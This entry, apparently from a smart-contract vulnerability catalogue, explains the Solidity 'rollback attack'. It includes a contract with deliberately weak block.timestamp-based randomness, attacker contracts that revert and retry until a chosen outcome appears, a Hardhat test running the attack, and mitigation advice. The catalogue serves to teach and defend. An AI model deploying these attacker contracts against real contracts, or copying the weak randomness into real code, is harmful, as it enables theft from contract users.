[back](../../README.md)
# Rollback Attack

**name:** Rollback Attack

**Severity:** Critical

**Description:** 

As its name suggests, a rollback attack is one in which the attacker repeatedly reverts transactions until he/she gets a preferred transaction. This happens quite often in scenarios where pseudo-random numbers are generated and applied. For example, in an NFT application where a pseudo-random number is generated for a buyer to mint an NFT whose features are closely related to the random number, if the buyer doesn't get a preferred NFT he/she would revert the transaction and mint repeatedly until he/she gets a preferred NFT. In such an attack, the attacker in general pays very few costs to revert transactions but gets huge profits from a successful transaction. 



**Language:** Solidity

**Code Sample:**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract RollBackDemo {

    uint public seed = block.timestamp;

    mapping(address => uint) public lucky;

    function getLuckyNumber(uint salt) external payable {
        require(msg.value == 1 ether, "not one ether");
        uint rand = getRand(salt);
        lucky[msg.sender] = rand;
    }

    // return a random number in range [1,10]
    // This is just an example and should never be used in real scenarios
    function getRand(uint salt) internal returns (uint) {
        uint n = uint(keccak256(abi.encodePacked(seed * 2 + 1,"my_rand",salt)));
        uint rand = n % 10 + 1;
        seed = rand * seed + 20;
        return rand;
    }
}

contract RollBackAttackDemo {
    function gogo(address target, uint salt) external payable {
        require(msg.value == 1 ether, "not one ether");
        RollBackDemo(target).getLuckyNumber{value:msg.value}(salt);
        uint number = RollBackDemo(target).lucky(address(this));
        if(number != 6) {
            revert("not lucky number");
        }
    }
}

contract RollBackAttackSource {
    uint public counter;
    bool public successful;
    function go(address attack, address target) external payable {
        require(msg.value == 10 ether, "not ten ether");
        for(uint i=0;i<10;i++) {
            counter ++;
            try RollBackAttackDemo(attack).gogo{value: 1 ether}(target,i+1){
                successful = true;
                payable(msg.sender).transfer(address(this).balance);
                return; //success
            }catch (bytes memory) {
                // retry
            }
        }
    }
}
```




**Description of Code Sample:**

Note: this sample just mimics a rollback attack. It rarely happens in real cases. It might not appropriate to apply this code to real applications.   

In the above code, the attacker calls RollBackAttackSource's go function, then RollBackAttackDemo's gogo function will be called and RollBackDemo's getLuckyNumber function will be called to generate a lucky number. The preferred lucky number is 6. Therefore if the number is not 6, the transaction will be reverted. The for loop tries 10 times. If it succeeds in any of the 10 tries it will return otherwise reverts and try again. Notably, when a transaction is reverted, all the state changes of RollBackDemo will be reverted which will lead to the same results in subsequent newly initiated transactions. Therefore we introduce a "salt" variable to force the subsequent transactions to generate different results.   



**Unit Test Code:**

```javascript
// SPDX-License-Identifier: GPL-3.0
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RollBackDemo Test", function () {
    let demo;
    let attack;
    let instance;
    let owner,user1,user2,users;

    beforeEach( async function() {
        let RollBackAttackSource = await ethers.getContractFactory("RollBackAttackSource");
        instance = await RollBackAttackSource.deploy();
        let RollBackAttackDemo = await ethers.getContractFactory("RollBackAttackDemo");
        attack = await RollBackAttackDemo.deploy();
        let RollBackDemo = await ethers.getContractFactory("RollBackDemo");
        demo = await RollBackDemo.deploy();
        [owner,user1,user2,...users] = await ethers.getSigners();
    });
    
    describe('RollBack attack demo', () => { 
        it("Try ten times to get lucky number!", async () => {
            await instance.go(attack.address,demo.address,{
                value:ethers.utils.parseEther("10")
            });
            let flag = await instance.successful();
            if(flag) {
                let counter =  + (await instance.counter()).toString();
                expect(await demo.lucky(attack.address)).to.be.equal(6);
                expect(await ethers.provider.getBalance(demo.address))
                    .to.be.equal(ethers.utils.parseEther("1.0"));
                console.log("Cogratulations! Amounts of retries:",counter)
            }else {
                expect(await ethers.provider.getBalance(demo.address))
                    .to.be.equal(0);
                console.log("Failed!, Try again!");
            }
        });
    });
});
```



**Real Case:**





**Recommendations:**

1. "require(tx.origin == msg.sender)" must be used to allow only an external account rather than a contract account to call.
2. Avoid using pseudo-random numbers to mitigate rollback attacks.

